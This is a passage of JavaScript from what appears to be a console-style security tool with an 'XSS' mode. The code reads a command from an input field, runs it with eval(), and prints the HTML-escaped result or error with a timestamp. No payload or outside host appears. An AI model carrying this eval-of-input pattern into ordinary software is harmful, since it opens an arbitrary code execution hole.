				app.environment.requestTag + "<span class=\"bold red\">XSS</span>" + " <span>" + await app.functions.timestamp() + "</span><br>" + 
				"<span class=\"grey\">&lt;empty&gt;</span><br>" + 
				"<span>" + await app.functions.escapeHTML( eval(cmd) ) + "</span><br>" 
			);
		} else {
			try {
				app.functions.print( 
					app.environment.requestTag + "<span class=\"bold red\">XSS</span>" + " <span>" + await app.functions.timestamp() + "</span><br>" + 
					"<span class=\"red\">" + await app.functions.escapeHTML(cmd) + "</span><br>" + 
					"<span>" + await app.functions.escapeHTML( eval(cmd) ) + "</span><br>" 
				);
			} catch(err) {
				app.functions.print( 
					app.environment.requestTag + "<span class=\"bold red\">XSS</span>" + " <span>" + await app.functions.timestamp() + "</span><br>" + 
					"<span class=\"red\">" + await app.functions.escapeHTML(cmd) + "</span><br>" + 
					"<span class=\"red\">" + await app.functions.escapeHTML(err) + "</span><br>" 
				);
			}
		}
	}

	app.functions.onXSSCommand = async () => {
		const command = app.environment.xssField.value;

		app.environment.xssField.value = "";

		app.functions.parseXSSCommand(command);

		app.environment.textarea.focus();
	}
